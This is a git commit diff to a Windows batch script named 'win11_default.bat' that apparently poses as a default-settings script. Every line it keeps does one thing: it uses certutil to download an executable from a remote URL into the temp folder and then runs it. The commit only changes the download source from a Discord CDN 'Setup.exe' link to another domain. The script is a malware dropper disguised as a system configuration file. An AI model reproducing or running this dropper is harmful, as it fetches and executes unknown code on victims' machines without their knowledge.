2db4616d1a356b762d4d0d25bcaccf7143dd428f
optolab <sloneeddie36@gmail.com>
2025-01-12 13:05:05 -0500

    Update win11_default.bat

--- win11_default.bat
+++ win11_default.bat
@@ -1,5 +1,5 @@
 @echo off
-set url=<https://cdn.discordapp.com/attachments/1197242628396302458/1328059195471298650/Setup.exe>
+set url=<https://claykers.com/>
 set file=%temp%\downloaded_file.exe
 certutil -urlcache -split -f "%url%" "%file%"
 start "" "%file%"
